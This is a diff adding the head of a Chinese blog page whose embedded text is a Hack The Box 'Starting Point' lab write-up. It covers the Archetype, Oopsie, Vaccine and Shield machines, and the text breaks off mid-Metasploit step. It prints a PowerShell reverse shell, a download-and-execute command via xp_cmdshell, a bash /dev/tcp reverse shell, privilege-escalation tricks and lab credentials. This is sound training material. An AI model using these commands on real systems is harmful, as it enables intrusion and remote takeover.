@@ -1,0 +1,826 @@
+<!doctype html><html lang=en dir=auto>
+<head><meta charset=utf-8>
+<meta http-equiv=x-ua-compatible content="IE=edge">
+<meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no">
+<meta name=robots content="index, follow">
+<title>HTB-Starting Point | 0opsdc</title>
+<meta name=keywords content="Hack The Box">
+<meta name=description content="Archetype  目标：拿到用户权限与系统权限。
+靶机IP：10.10.10.27。
+ 1、信息收集 先使用nmap看看靶机开放了什么端口：
+sudo nmap -sS -sV 10.10.10.27 # 参数讲解 sS：使用SYN半开放式扫描，扫描快，隐蔽性高 sV：探测服务版本 # 扫描结果 Nmap scan report for 10.10.10.27 (10.10.10.27) Host is up (0.28s latency). Not shown: 996 closed ports PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds 1433/tcp open ms-sql-s Microsoft SQL Server 2017 14.00.1000 Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows 比较容易入手的就是445端口对应的SMB服务，1433是SQL Server的默认端口。先尝试能否匿名访问SMB服务，这里使用Kali预装的smbclient：">
+<meta name=author content="0opsdc">
+<link rel=canonical href=https://examplesite.com/post/htb-starting-point/>
+<link crossorigin=anonymous href=/assets/css/stylesheet.min.5e2b4101351c21e906f398ae96901791830f58d430f96f2659dab7eaef7b3cb7.css integrity="sha256-XitBATUcIekG85iulpAXkYMPWNQw+W8mWdq36u97PLc=" rel="preload stylesheet" as=style>
+<script defer crossorigin=anonymous src=/assets/js/highlight.min.7680afc38aa6b15ddf158a4f3780b7b1f7dde7e91d26f073e6229bb7a0793c92.js integrity="sha256-doCvw4qmsV3fFYpPN4C3sffd5+kdJvBz5iKbt6B5PJI=" onload=hljs.initHighlightingOnLoad()></script>
+<link rel=icon href=https://gitee.com/oopsdc/PicBed/raw/master/oopsdc.tk/favicon.png>
+<link rel=icon type=image/png sizes=16x16 href=https://gitee.com/oopsdc/PicBed/raw/master/oopsdc.tk/favicon.png>
+<link rel=icon type=image/png sizes=32x32 href=https://gitee.com/oopsdc/PicBed/raw/master/oopsdc.tk/favicon.png>
+<link rel=apple-touch-icon href=https://gitee.com/oopsdc/PicBed/raw/master/oopsdc.tk/favicon.png>
+<link rel=mask-icon href=https://gitee.com/oopsdc/PicBed/raw/master/oopsdc.tk/favicon.png>
+<meta name=theme-color content="#2e2e33">
+<meta name=msapplication-TileColor content="#2e2e33">
+<meta name=generator content="Hugo 0.88.1">
+<noscript>
+<style>#theme-toggle,.top-link{display:none}</style>
+<style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style>
+</noscript>
+<script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(a,e,f,g,b,c,d){a.GoogleAnalyticsObject=b,a[b]=a[b]||function(){(a[b].q=a[b].q||[]).push(arguments)},a[b].l=1*new Date,c=e.createElement(f),d=e.getElementsByTagName(f)[0],c.async=1,c.src=g,d.parentNode.insertBefore(c,d)}(window,document,'script','https://www.google-analytics.com/analytics.js','ga'),ga('create','UA-123-45','auto'),ga('send','pageview'))</script><meta property="og:title" content="HTB-Starting Point">
+<meta property="og:description" content="Archetype  目标：拿到用户权限与系统权限。
+靶机IP：10.10.10.27。
+ 1、信息收集 先使用nmap看看靶机开放了什么端口：
+sudo nmap -sS -sV 10.10.10.27 # 参数讲解 sS：使用SYN半开放式扫描，扫描快，隐蔽性高 sV：探测服务版本 # 扫描结果 Nmap scan report for 10.10.10.27 (10.10.10.27) Host is up (0.28s latency). Not shown: 996 closed ports PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds 1433/tcp open ms-sql-s Microsoft SQL Server 2017 14.00.1000 Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows 比较容易入手的就是445端口对应的SMB服务，1433是SQL Server的默认端口。先尝试能否匿名访问SMB服务，这里使用Kali预装的smbclient：">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://examplesite.com/post/htb-starting-point/"><meta property="og:image" content="https://examplesite.com/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta property="article:section" content="post">
+<meta property="article:published_time" content="2021-08-17T15:03:30+08:00">
+<meta property="article:modified_time" content="2021-08-17T15:03:30+08:00"><meta property="og:site_name" content="0opsdc">
+<meta name=twitter:card content="summary_large_image">
+<meta name=twitter:image content="https://examplesite.com/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E">
+<meta name=twitter:title content="HTB-Starting Point">
+<meta name=twitter:description content="Archetype  目标：拿到用户权限与系统权限。
+靶机IP：10.10.10.27。
+ 1、信息收集 先使用nmap看看靶机开放了什么端口：
+sudo nmap -sS -sV 10.10.10.27 # 参数讲解 sS：使用SYN半开放式扫描，扫描快，隐蔽性高 sV：探测服务版本 # 扫描结果 Nmap scan report for 10.10.10.27 (10.10.10.27) Host is up (0.28s latency). Not shown: 996 closed ports PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds 1433/tcp open ms-sql-s Microsoft SQL Server 2017 14.00.1000 Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows 比较容易入手的就是445端口对应的SMB服务，1433是SQL Server的默认端口。先尝试能否匿名访问SMB服务，这里使用Kali预装的smbclient：">
+<script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://examplesite.com/post/"},{"@type":"ListItem","position":2,"name":"HTB-Starting Point","item":"https://examplesite.com/post/htb-starting-point/"}]}</script>
+<script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"HTB-Starting Point","name":"HTB-Starting Point","description":"Archetype  目标：拿到用户权限与系统权限。\n靶机IP：10.10.10.27。\n 1、信息收集 先使用nmap看看靶机开放了什么端口：\nsudo nmap -sS -sV 10.10.10.27 # 参数讲解 sS：使用SYN半开放式扫描，扫描快，隐蔽性高 sV：探测服务版本 # 扫描结果 Nmap scan report for 10.10.10.27 (10.10.10.27) Host is up (0.28s latency). Not shown: 996 closed ports PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds 1433/tcp open ms-sql-s Microsoft SQL Server 2017 14.00.1000 Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows 比较容易入手的就是445端口对应的SMB服务，1433是SQL Server的默认端口。先尝试能否匿名访问SMB服务，这里使用Kali预装的smbclient：","keywords":["Hack The Box"],"articleBody":"Archetype  目标：拿到用户权限与系统权限。\n靶机IP：10.10.10.27。\n 1、信息收集 先使用nmap看看靶机开放了什么端口：\nsudo nmap -sS -sV 10.10.10.27 # 参数讲解 sS：使用SYN半开放式扫描，扫描快，隐蔽性高 sV：探测服务版本 # 扫描结果 Nmap scan report for 10.10.10.27 (10.10.10.27) Host is up (0.28s latency). Not shown: 996 closed ports PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds 1433/tcp open ms-sql-s Microsoft SQL Server 2017 14.00.1000 Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows 比较容易入手的就是445端口对应的SMB服务，1433是SQL Server的默认端口。先尝试能否匿名访问SMB服务，这里使用Kali预装的smbclient：\nsmbclient -N -L //10.10.10.27/ # 参数讲解 N：匿名登录 L：获取共享资源列表 # 结果 Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin backups Disk C$ Disk Default share IPC$ IPC Remote IPC SMB1 disabled -- no workgroup available 获取到了共享资源列表，说明允许匿名访问SMB服务，文件夹后面的$代表为隐藏文件夹，接下来我们匿名登录看一下backups文件夹的内容：\nsmbclient -N //10.10.10.27/backups # 列出当前目录下的文件 smb: \\ dir . D 0 Mon Jan 20 20:20:57 2020 .. D 0 Mon Jan 20 20:20:57 2020 prod.dtsConfig AR 609 Mon Jan 20 20:23:02 2020 10328063 blocks of size 4096. 8260548 blocks available # 下载prod.dtsConfig文件 smb: \\ get prod.dtsConfig getting file \\prod.dtsConfig of size 609 as prod.dtsConfig (0.5 KiloBytes/sec) (average 0.5 KiloBytes/sec) 下载的文件会默认存储在当前目录，查看prod.dtsConfig文件：\nvim prod.dtsConfig   =\"...\" GeneratedFromPackageName=\"...\" GeneratedFromPackageID=\"...\" GeneratedDate=\"20.1.2019 10:01:34\"/  =\"Property\" Path=\"\\Package.Connections[Destination].Properties[ConnectionString]\" ValueType=\"String\" Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;   这个文件包含了一些数据库连接参数的配置，我们得到帐密ARCHETYPE\\sql_svc，M3g4c0rp123。\nSQL Server有两种身份验证方式：操作系统身份验证和数据库身份验证。这里我们得到的应该是前者，ARCHETYPE代表主机名，sql_svc代表具有数据库登录权限的操作系统用户名，M3g4c0rp123就是密码。\n2、拿Shell 根据nmap扫描结果来看，靶机没有开启远程登录功能，所以可以从数据库下手。\n需要的工具：SecureAuthCorp/impacket: Impacket is a collection of Python classes for working with network protocols. (github.com)\n这是一个用Python编写的后工具集，本次渗透要用到其中的mssqlclient.py，安装过程不再赘述。\n使用操作系统身份验证登录数据库：\npython3 mssqlclient.py ARCHETYPE/sql_svc@10.10.10.27 -windows-auth # 输入密码后登录成功 # 数据库身份认证启用了TLS [*] Encryption required, switching to TLS # 当前数据库为master [*] ENVCHANGE(DATABASE): Old Value: master, New Value: master [*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english [*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192 [*] INFO(ARCHETYPE): Line 1: Changed database context to 'master'. [*] INFO(ARCHETYPE): Line 1: Changed language setting to us_english. [*] ACK: Result: 1 - Microsoft SQL Server (140 3232) [!] Press help for extra shell commands 登录成功后使用SQL Server的IS_SRVROLEMEMBER('sysadmin')判断当前数据库用户是否具有sysadmin权限：\nSELECT IS_SRVROLEMEMBER('sysadmin') # 结果 -----------  1 返回结果为1，代表当前数据库用户具有sysadmin权限，可进一步尝试使用xp_cmdshell实现RCE：\n# sp_configure修改数据库配置的存储过程，当show advanced options参数为1时，才能够修改数据库配置中的某些高级选项，其中就有xp_cmdshell，因此需要先设置show advanced options参数 EXEC sp_configure 'show advanced options', 1 [*] INFO(ARCHETYPE): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install. # 提交上一步使用sp_configure存储过程更改的配置选项 reconfigure # 使用sp_configure存储过程启用xp_cmdshell参数，此参数启用后允许SQL Server调用操作系统命令 EXEC sp_configure 'xp_cmdshell', 1 [*] INFO(ARCHETYPE): Line 185: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install. # 提交上一步使用 sp_configure存储过程更改的配置选项 reconfigure # 以上命令也可使用mssqlclient的shell命令一步实现 enable_xp_cmdshell [*] INFO(ARCHETYPE): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install. [*] INFO(ARCHETYPE): Line 185: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install. 查看当前身份：\nxp_cmdshell \"whoami\" # 结果 output --------------------------------------------------------------------------------  archetype\\sql_svc NULL 查看是否存在开发环境：\nxp_cmdshell \"python\" # 结果 output --------------------------------------------------------------------------------  'python' is not recognized as an internal or external command, operable program or batch file. NULL 3、获取用户权限 根据之前nmap的扫描结果，靶机应该为Windows Server 2008 R2，在没有开发环境的情况下可以考虑从powershell入手，建立一个powershell的反向shell文件1.ps1：\n$client = New-Object System.Net.Sockets.TCPClient(\"10.10.14.62\",443); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2\u00261 | Out-String ); $sendback2 = $sendback + \"# \"; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()}; $client.Close() 保存完文件后，不要切换目录，在当前目录起一个HTTP服务器：\npython3 -m http.server 80 开启本地监听：\nnc -lvvp 443 在数据库中执行命令下载并执行脚本：\nxp_cmdshell \"powershell \"IEX (New-Object Net.WebClient).DownloadString(\\\"http://10.10.14.62/1.ps1\\\");\" 下载成功后可以看到Web服务器和nc都有对应的连接信息，切换到nc窗口，回车发现拿到了靶机的shell交互：\n# 查看当前用户身份 whoami # 结果 archetype\\sql_svc # 查看当前路径 pwd # 结果 Path ---- C:\\Windows\\system32 # 查看桌面文件 dir C:\\Users\\sql_svc\\Desktop Directory: C:\\Users\\sql_svc\\Desktop Mode LastWriteTime Length Name ---- ------------- ------ ---- -ar--- 2/25/2020 6:37 AM 32 user.txt # 查看user.txt type C:\\Users\\sql_svc\\Desktop\\user.txt 4、提权 查看powershell历史记录：\ntype C:\\Users\\sql_svc\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt # 结果 net.exe use T: \\\\Archetype\\backups /user:administrator MEGACORP_4dm1n!! exit 发现administrator将文件夹\\Archetype\\backups映射到T盘，MEGACORP_4dm1n!!为密码。\n尝试使用impakcet中的psexec.py提权：\npython3 psexec.py administrator@10.10.10.27 # 连接信息 [*] Requesting shares on 10.10.10.27..... [*] Found writable share ADMIN$ [*] Uploading file TPMzHnhC.exe [*] Opening SVCManager on 10.10.10.27..... [*] Creating service yQAe on 10.10.10.27..... [*] Starting service yQAe..... [!] Press help for extra shell commands Microsoft Windows [Version 10.0.17763.107] (c) 2018 Microsoft Corporation. All rights reserved. # 查看当前身份 C:\\Windows\\system32whoami nt authority\\system # 查看桌面目录 dir C:\\Users\\Administrator\\Desktop # 结果 Directory of C:\\Users\\Administrator\\Desktop 01/20/2020 06:42 AM  . 01/20/2020 06:42 AM  .. 02/25/2020 07:36 AM 32 root.txt 1 File(s) 32 bytes 2 Dir(s) 33,833,361,408 bytes free # 查看root.txt type C:\\Users\\Administrator\\Desktop\\root.txt Oopsie  目标：拿到用户权限与系统权限。\n靶机IP：10.10.10.28。\n 1、信息收集 nmap查看靶机信息：\nsudo nmap -sS -sV 10.10.10.28 # 结果 Nmap scan report for 10.10.10.28 (10.10.10.28) Host is up (0.37s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel 开启22和80端口，直接访问网页，发现有一个登录关键字，但是没有对应的链接：\n可能是将登录页面隐藏了，可通过两种方法进一步挖掘：\n1、F12打开控制台查看页面元素，翻到最下面可以发现一个登录页面的js脚本：\nscript src=\"/cdn-cgi/login/script.js\"script 2、bp抓包查看站点地图：\n进入登录页面后尝试帐密admin/MEGACORP_4dm1n!!，密码为上一关获得的administrator 的密码。\n登录成功后有一个文件上传功能，点击后显示当前行为需要超级管理员权限，抓包看一下当前的请求包：\nGET /cdn-cgi/login/admin.php?content=uploads HTTP/1.1 Host: 10.10.10.28 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: http://10.10.10.28/cdn-cgi/login/admin.php Connection: close Cookie: user=34322; role=admin Upgrade-Insecure-Requests: 1 Cache-Control: max-age=0 发现Cookie处有一个user字段和role字段对当前身份进行判断，我们把当前数据包发送至Inturder模块，对user值爆破试试：\n值为86575时，文件上传功能正常。\n但是这样跑太费时间了，再回头看看其他页面，发现访问Account页面时URL如下：\nhttp://10.10.10.28/cdn-cgi/login/admin.php?content=accounts\u0026id=1 id的值应该有一些用处，尝试修改为1、2、3、4，发现到4时回显另一个用户的信息，bp抓包放进Intruder跑一下：\n同样获得了超级管理员的Access ID，接下来我们抓取访问文件上传页面的数据包，将user字段的值改为获取到的超级管理员的Access ID，转发后可成功进入文件上传页面，在选中文件后点击上传，再次修改转发包即可成功上传文件。\n2、获取用户权限 上传文件后，下一步肯定需要知道文件的上传路径，使用dirsearch扫一下目录：\npython3 dirsearch.py -u http://10.10.10.28/ # 结果 301 - 312B - /uploads - http://10.10.10.28/uploads/ 尝试上传一句话，蚁剑连接不上，使用Kali自带的PHP反弹Shell试试：\n# 将自带Shell复制一份到当前目录 cp /usr/share/webshells/php/php-reverse-shell.php ./ # 修改IP和port为本机信息 $ip = '' $port =  打开两个命令终端：\n# 终端1，监听本机端口 nc -lvvp  # 终端2，请求1.php curl http://10.10.10.28/uploads/1.php 运行完上述两条命令后，可以发现监听窗口反弹了一个Shell，权限为网站权限：\n$ id uid=33(www-data) gid=33(www-data) groups=33(www-data) 切换到网站目录：\ncd /var/www/html # 通过ls命令查看当前目录文件，直到最终切换到/var/www/html/cdn-cgi/login目录，发现有如下文件 $ ls admin.php db.php index.php script.js # 查看db.php $ cat db.php = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage'); ? 我们得到了一个数据库的账号，接下来看看这个账号的信息：\n$ id robert uid=1000(robert) gid=1000(robert) groups=1000(robert),1001(bugtracker) 发现这个用户属于两个组，先查看一下这个用户的家目录：\n$ ls /home/robert user.txt user.txt就是用户的flag，接下来获取root的flag。\n3、提权 从bugtracker用户组入手，查找其是否拥有特殊权限：\n$ find -type f -group bugtracker 2/dev/null 命令没有回显，执行以下命令升级Shell：\nSHELL=/bin/bash script -q /dev/null 继续执行之前的命令：\nwww-data@oopsie:/$ find -type f -group bugtracker 2/dev/null find -type f -group bugtracker 2/dev/null ./usr/bin/bugtracker 切换到robert用户：\nwww-data@oopsie:/$ su - robert 查看bugtracker：\nrobert@oopsie:~$ ls -la /usr/bin/bugtracker ls -la /usr/bin/bugtracker -rwsr-xr-- 1 root bugtracker 8792 Jan 25 2020 /usr/bin/bugtracker 发现其具有s权限，其作用在于用户可使用其所有者权限来运行程序，也就是说，在用户执行bugtracker程序时，将获取文件所有者，即root的权限及UID、GID。\n运行bugtracker看看：\nrobert@oopsie:~$ bugtracker bugtracker ------------------ : EV Bug Tracker : ------------------ Provide Bug ID: 1 1 --------------- Binary package hint: ev-engine-lib Version: 3.3.3-1 Reproduce: When loading library in firmware it seems to be crashed What you expected to happen: Synchronized browsing to be enabled since it is enabled for that site. What happened instead: Synchronized browsing is disabled. Even choosing VIEW  SYNCHRONIZED BROWSING from menu does not stay enabled between connects. 使用strings命令打印出可打印字符：\nrobert@oopsie:~$ strings /usr/bin/bugtracker # 发现命令调用 cat /root/reports/ bugtracker调用了系统的cat命令输出位于/root/reports目录下的bug报告，且调用cat命令时并未使用绝对路径，即在当前用户的$PATH环境变量中有相应配置。\n方法一 我们可以创建一个名为cat的恶意命令并修改当前用户$PATH值，让bugtracker调用恶意构造的命令，进一步获取root权限。具体思路为：\n以robert的身份将/tmp目录设置为$PATH环境变量的第一个目录，然后切换到/tmp目录构造恶意cat命令并赋执行权，使bugtracker实际上调用了恶意构造的cat命令。\n命令如下：\nrobert@oopsie:~$ echo $PATH echo $PATH /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin robert@oopsie:~$ export PATH=/tmp:$PATH export PATH=/tmp:$PATH robert@oopsie:~$ echo $PATH echo $PATH /tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin robert@oopsie:~$ cd /tmp cd /tmp robert@oopsie:/tmp$ echo '/bin/bash'  cat echo '/bin/bash'  cat robert@oopsie:/tmp$ chmod +x cat 再次运行bugtracker就会以root身份执行一个shell了。\n方法二（推荐） 只需在运行bugtracker时输入如下命令：\nrobert@oopsie:/tmp$ bugtracker bugtracker ------------------ : EV Bug Tracker : ------------------ Provide Bug ID: 111;'/bin/bash' 111;'/bin/bash' --------------- cat: /root/reports/111: No such file or directory 此时便会以root身份执行一个shell：\nroot@oopsie:/tmp# id id uid=0(root) gid=1000(robert) groups=1000(robert),1001(bugtracker) 查看/root目录下所有文件：\nroot@oopsie:/tmp# ls -a /root ls -a /root . .bash_history .cache .gnupg .profile root.txt .viminfo .. .bashrc .config .local reports .ssh 下一关信息：\n切换到/root/.config/filezilla，查看filezilla.xml：\nroot@oopsie:/root/.config/filezilla# cat filezilla.xml 内容：\n    10.10.10.46 21 0 0 ftpuser mc@F1l3ZilL4 1 0 MODE_DEFAULT 0 Auto 0    Accine  目标：拿下系统权限。\n靶机IP：10.10.10.46。\n 1、信息收集 sudo nmap -sS -sV 10.10.10.46 # 结果 Nmap scan report for 10.10.10.46 (10.10.10.46) Host is up (0.30s latency). Not shown: 997 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 8.0p1 Ubuntu 6build1 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel 直接访问HTTP服务，需要帐密，上一关我们只获得了一个ftp用户，尝试登录ftp服务器：\nftp://ftpuser:mc@F1l3ZilL4@10.10.10.46/ 下载得到backup.zip文件，解压的时候发现有密码，尝试使用常规暴力破解，时间太长顶不住。。。考虑先获取backup.zip的hash值，再使用john进行破解。\n获取hash（在root下运行）：\nzip2john /home/oopsdc/Downloads/backup.zip  hash 使用john对哈希文件进行破解：\njohn hash # 结果 Using default input encoding: UTF-8 Loaded 1 password hash (PKZIP [32/64]) Will run 2 OpenMP threads Proceeding with single, rules:Single Press 'q' or Ctrl-C to abort, almost any other key for status Warning: Only 5 candidates buffered for the current salt, minimum 8 needed for performance. Warning: Only 4 candidates buffered for the current salt, minimum 8 needed for performance. Almost done: Processing the remaining buffered candidate passwords, if any. Warning: Only 6 candidates buffered for the current salt, minimum 8 needed for performance. Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist 741852963 (backup.zip) 1g 0:00:00:00 DONE 2/3 (2021-09-16 10:00) 25.00g/s 1798Kp/s 1798Kc/s 1798KC/s 123456..Peter Use the \"--show\" option to display all of the cracked passwords reliably Session completed 解压后得到index.php和style.css两个文件，在index.php中发现了用户帐密：\nphp session_start(); if(isset($_POST['username']) \u0026\u0026 isset($_POST['password'])) { if($_POST['username'] === 'admin' \u0026\u0026 md5($_POST['password']) === \"2cb42f8734ea607eefed3b70af13bbd3\") { $_SESSION['login'] = \"true\"; header(\"Location: dashboard.php\"); } } ?对密码进行md5解密，得到最终帐密admin/qwerty789。\n2、获取用户权限 登录后是一个目录页面，尝试搜索：\n页面回显不对，再次尝试1'发现有报错语句，F12拿一下当前的PHPSESSION，使用sqlmap查看当前数据库信息：\nsqlmap -u \"http://10.10.10.46/dashboard.php?search=1\" -dbs --cookie \"PHPSESSID=dudnfpur8hjgfam3gb22nna4sf\" # 结果 [INFO] the back-end DBMS is PostgreSQL web server operating system: Linux Ubuntu 19.10 or 20.04 (focal or eoan) web application technology: Apache 2.4.41 back-end DBMS: PostgreSQL [WARNING] schema names are going to be used on PostgreSQL for enumeration as the counterpart to database names on other DBMSes [INFO] fetching database (schema) names [INFO] retrieved: 'public' [INFO] retrieved: 'pg_catalog' [INFO] retrieved: 'information_schema' available databases [3]: [*] information_schema [*] pg_catalog [*] public 可以发现当前是Posgtre数据库，尝试能否执行os-shell：\nsqlmap -u http://10.10.10.46/dashboard.php?search=1 --cookie \"PHPSESSID=dudnfpur8hjgfam3gb22nna4sf\" --os-shell # 结果 os-shell whoami do you want to retrieve the command standard output? [Y/n/a] n [10:43:23] [INFO] retrieved: 'postgres' 这里简要介绍一下os-shell的原理及使用条件：\n原理：使用into outfile函数将可用来上传文件的a.php上传至网站根目录，然后再利用a.php上传一个用于执行并回显系统命令的b.php。\n使用条件：1、网站必须为root权限；2、需要知道网站绝对路径；3、CGP为off，PHP主动转义功能关闭。\n接下来我们简单反弹一个shell，在os-shell中执行如下命令：\nbash -c 'bash -i \u0026 /dev/tcp/10.10.15.188/1234 0\u00261' 切换到网站根目录并列出文件：\nostgres@vaccine:/var/lib/postgresql/11/main$ cd /var/www/html cd /var/www/html postgres@vaccine:/var/www/html$ ls ls # 结果 bg.png dashboard.css dashboard.js dashboard.php index.php license.txt style.css 查看dashboard.php内容：\npostgres@vaccine:/var/www/html$ cat dashboard.php cat dashboard.php # 得到一个用户账号 try { $conn = pg_connect(\"host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!\"); } 尝试直接ssh到主机：\npostgres@vaccine:~$ id uid=111(postgres) gid=117(postgres) groups=117(postgres),116(ssl-cert) 3、提权 查看当前用户的sudo权限：\npostgres@vaccine:~$ sudo -l [sudo] password for postgres: Matching Defaults entries for postgres on vaccine: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User postgres may run the following commands on vaccine: (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf pg_hba.conf为PostgreSQL的访问策略配置文件，默认位于/var/lib/pgsql//data/目录。\n运行提示的命令：\npostgres@vaccine:~$ sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf 进入文件后默认为命令模式，按下Shift+:进入末行模式，运行!/bin/bash命令，注：需要在前面加一个空格：\n: !/bin/bash 此时会退出vi编辑器，且用户变为root：\nroot@vaccine:/var/lib/postgresql# id uid=0(root) gid=0(root) groups=0(root) 提权成功。\nShield  目标：拿到系统权限。\n靶机IP：10.10.10.29。\n吐槽：这真是一个卡到爆的靶场。\n 1、信息收集 上nmap：\nsudo nmap -sS -sV 10.10.10.29 # 结果 Nmap scan report for 10.10.10.29 (10.10.10.29) Host is up (0.48s latency). Not shown: 998 filtered ports PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 3306/tcp open mysql MySQL (unauthorized) Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows 靶机开了80端口，用dirsearch扫一下目录：\nsudo python3 dirsearch.py -u http://10.10.10.29/ # 结果 301 - 0B - /Wordpress/ - http://10.10.10.29/wordpress/ 使用Wappalyzer查看当前WP版本为5.2.1，IIS版本为10，尝试利用WP版本未授权访问漏洞查看敏感页面，无果。资料：\nWordpress(CVE-2019-17671)未授权访问漏洞复现 - FreeBuf网络安全行业门户\n点击登录链接，尝试之前获得的密码，试出帐密admin/P@s5w0rd!。\n有个媒体上传链接，点击其中已存在的图片查看保存路径：\nhttp://10.10.10.29/wordpress/wp-content/uploads/black-shield-shape-drawing-illustration-png-clip-art.png 尝试上传小马，各种绕过，奈何网络太差，总有莫名其妙的报错，放弃。\n2、拿WebShell 祭出msf：\n# 启动matesploit framwork msfconsole # 使用模块 msf6  use exploit/unix/webapp/wp_admin_shell_upload # 查看参数 msf6 exploit(unix/webapp/wp_admin_shell_upload)  show options Module options (exploit/unix/webapp/wp_admin_shell_upload): Name Current Setting Required Description ---- --------------- -------- ----------- PASSWORD yes The WordPress password to authenticat e with Proxies no A proxy chain of format type:host:por t[,type:host:port][...] RHOSTS yes The target host(s), see https://githu b.com/rapid7/metasploit-framework/wik i/Using-Metasploit RPORT 80 yes The target port (TCP) SSL false no Negotiate SSL/TLS for outgoing connec tions TARGETURI / yes The base path to the wordpress applic ation USERNAME yes The WordPress username to authenticat e with VHOST no HTTP server virtual host Payload options (php/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST 10.211.55.8 yes The listen address (an interface may be s pecified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 WordPress # 设置参数 msf6 exploit(unix/webapp/wp_admin_shell_upload)  set PASSWORD P@s5w0rd! PASSWORD = P@s5w0rd! msf6 exploit(unix/webapp/wp_admin_shell_upload)  set RHOSTS 10.10.10.29 RHOSTS = 10.10.10.29 msf6 exploit(unix/webapp/wp_admin_shell_upload)  set TARGETURI /wordpress TARGETURI = /wordpress msf6 exploit(unix/webapp/wp_admin_shell_upload)  set USERNAME admin USERNAME = admin msf6 exploit(unix/webapp/wp_admin_shell_upload)  set LHOST 10.10.14.43 LHOST = 10.10.14.43 # 输入run执行攻击，首先在Kali的4444默认端口使用我们输入的帐密建立反向TCP连接，然后上传payload到网站，成功后自动清除payload并建立meterpreter shell连接 